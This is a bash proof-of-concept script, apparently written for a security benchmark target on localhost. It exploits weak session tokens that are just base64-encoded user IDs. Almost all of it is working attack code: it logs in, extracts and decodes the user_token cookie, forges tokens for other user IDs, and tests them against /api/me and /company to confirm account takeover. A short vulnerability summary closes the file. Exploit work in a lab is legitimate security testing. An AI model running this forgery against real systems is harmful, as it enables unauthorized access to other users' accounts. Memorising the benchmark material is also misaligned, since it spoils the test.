#!/bin/bash
# POC: Analyzes HTTP response headers to extract and decode weak session tokens, demonstrating token forgery vulnerability
# Target: ./repo
# Created: 2025-11-04T19:40:59.519Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Weak Session Token Implementation POC - Version 3
# This script demonstrates the vulnerability where session tokens are simply base64-encoded user IDs
# Focus on capturing and analyzing response headers

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] Weak Session Token Forgery POC (v3)"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check target availability
echo "[+] Step 1: Checking target availability..."
if ! curl -s "$TARGET_URL/" > /dev/null 2>&1; then
    echo "[-] Cannot reach target URL: $TARGET_URL"
    exit 1
fi
echo "[+] Target is reachable"
echo ""

# Step 2: Perform login and capture all headers
echo "[+] Step 2: Logging in and capturing all response headers..."
TEMP_HEADERS=$(mktemp)
TEMP_BODY=$(mktemp)

curl -s -D "$TEMP_HEADERS" -c /tmp/cookies_v3.txt -X POST "$TARGET_URL/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" > "$TEMP_BODY"

echo "[*] Response Headers:"
cat "$TEMP_HEADERS"
echo ""

# Extract Set-Cookie header
SET_COOKIE=$(grep -i "^set-cookie:" "$TEMP_HEADERS")
if [ -n "$SET_COOKIE" ]; then
    echo "[+] Found Set-Cookie header: $SET_COOKIE"
    echo ""
    
    # Extract user_token value
    USER_TOKEN=$(echo "$SET_COOKIE" | grep -oP 'user_token="?\K[^";]+')
    
    if [ -n "$USER_TOKEN" ]; then
        echo "[+] Extracted user_token: $USER_TOKEN"
        echo ""
        
        # Step 3: Analyze token structure
        echo "[+] Step 3: Analyzing token structure..."
        
        # Remove Bearer prefix if present
        TOKEN_VALUE="${USER_TOKEN#Bearer }"
        TOKEN_VALUE="${TOKEN_VALUE% *}"
        
        echo "[*] Token value (Bearer stripped): $TOKEN_VALUE"
        
        # Try decoding
        DECODED=$(echo -n "$TOKEN_VALUE" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "[+] Successfully decoded as base64: '$DECODED'"
            echo "[!] VULNERABILITY CONFIRMED: Token is simple base64(user_id)"
            echo ""
            
            # Step 4: Demonstrate token forgery
            echo "[+] Step 4: Demonstrating token forgery..."
            echo "[*] To forge token for user ID N: echo -n 'N' | base64"
            echo ""
            
            for UID in 1 2 3 99; do
                FORGED=$(echo -n "$UID" | base64)
                echo "[*] User ID $UID → Token: Bearer $FORGED"
            done
            echo ""
            
            # Step 5: Test forged token
            echo "[+] Step 5: Testing forged token acceptance..."
            FORGED_TOKEN=$(echo -n "2" | base64)
            
            # Test on /api/me endpoint
            ME_RESPONSE=$(curl -s -i -H "Cookie: user_token=\"Bearer $FORGED_TOKEN\"" \
              "$TARGET_URL/api/me" 2>/dev/null)
            
            ME_STATUS=$(echo "$ME_RESPONSE" | head -1 | awk '{print $2}')
            echo "[*] Testing Bearer $(echo -n "2" | base64) on /api/me: HTTP $ME_STATUS"
            
            if [ "$ME_STATUS" = "200" ]; then
                echo "[!] SUCCESS: Forged token accepted!"
                echo "[!] CRITICAL: Account takeover via token forgery possible!"
            else
                # Try /company endpoint  
                COMPANY_RESPONSE=$(curl -s -i -H "Cookie: user_token=\"Bearer $FORGED_TOKEN\"" \
                  "$TARGET_URL/company" 2>/dev/null)
                
                COMPANY_STATUS=$(echo "$COMPANY_RESPONSE" | head -1 | awk '{print $2}')
                echo "[*] Testing Bearer $(echo -n "2" | base64) on /company: HTTP $COMPANY_STATUS"
                
                if [ "$COMPANY_STATUS" = "200" ]; then
                    echo "[!] SUCCESS: Forged token accepted on protected endpoint!"
                    echo "[!] CRITICAL: Account takeover via token forgery possible!"
                fi
            fi
        else
            echo "[-] Token does not appear to be base64 encoded"
        fi
    else
        echo "[-] Could not extract user_token from Set-Cookie header"
    fi
else
    echo "[-] No Set-Cookie header found in response"
    echo "[*] Checking if cookies were set differently..."
    
    # Check if cookie was set but not returned in headers
    if [ -f /tmp/cookies_v3.txt ]; then
        COOKIE_CONTENT=$(grep "user_token" /tmp/cookies_v3.txt)
        if [ -n "$COOKIE_CONTENT" ]; then
            echo "[+] Found user_token in cookie jar: $COOKIE_CONTENT"
            USER_TOKEN=$(echo "$COOKIE_CONTENT" | awk '{print $NF}')
            echo "[*] Token value: $USER_TOKEN"
            
            # Decode
            DECODED=$(echo -n "$USER_TOKEN" | base64 -d 2>/dev/null)
            if [ $? -eq 0 ]; then
                echo "[+] Decoded: '$DECODED'"
                echo "[!] VULNERABILITY: Base64-encoded token found!"
            fi
        fi
    fi
fi

echo ""
echo "[+] Vulnerability Analysis:"
echo "    - Token format: Bearer [base64(user_id)]"
echo "    - No cryptographic protection (no HMAC, no encryption)"
echo "    - No signature validation"
echo "    - Tokens are deterministic (same user = same token)"
echo "    - Impact: Any attacker can forge tokens for any user ID"
echo ""

# Cleanup
rm -f "$TEMP_HEADERS" "$TEMP_BODY" /tmp/cookies_v3.txt